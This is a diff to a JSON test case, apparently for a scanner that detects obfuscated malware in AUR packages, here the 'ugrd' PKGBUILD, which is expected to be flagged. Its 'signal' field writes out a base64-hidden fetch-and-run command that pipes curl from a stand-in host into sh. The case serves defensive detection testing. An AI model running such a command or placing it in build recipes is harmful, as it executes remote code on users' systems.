@@ -2,11 +2,9 @@
   "package": "ugrd",
   "pkgbase": "ugrd",
   "old": null,
-  "new": "2.2.0-2",
   "expect": "flagged",
   "source": "No documented AUR incident found that planted a base64 payload in a PKGBUILD; secondary coverage of the June 2026 AUR wave reports base64 strings in a packaged NeoVim plugin's init script decoding to a curl command (https://news.lavx.hu/article/arch-linux-aur-faces-fresh-wave-of-obfuscated-malware). Technique: MITRE ATT&CK T1027 and T1140, https://attack.mitre.org/techniques/T1140/ ; base recipe AUR ugrd commit 028cd7c479c88301e8de40b17ec7961d2c9c0a65, https://aur.archlinux.org/cgit/aur.git/commit/?h=ugrd&id=028cd7c479c88301e8de40b17ec7961d2c9c0a65; recipe licence: 0BSD (LICENSE in the AUR repository)",
   "signal": "build() decodes a base64 string into sh; it decodes to `curl -s https://cdn-pypi.invalid/ugrd/postinstall | sh`",
   "install": "none",
-  "installerRisk": false,
-  "recipe": "new"
+  "installerRisk": false
 }
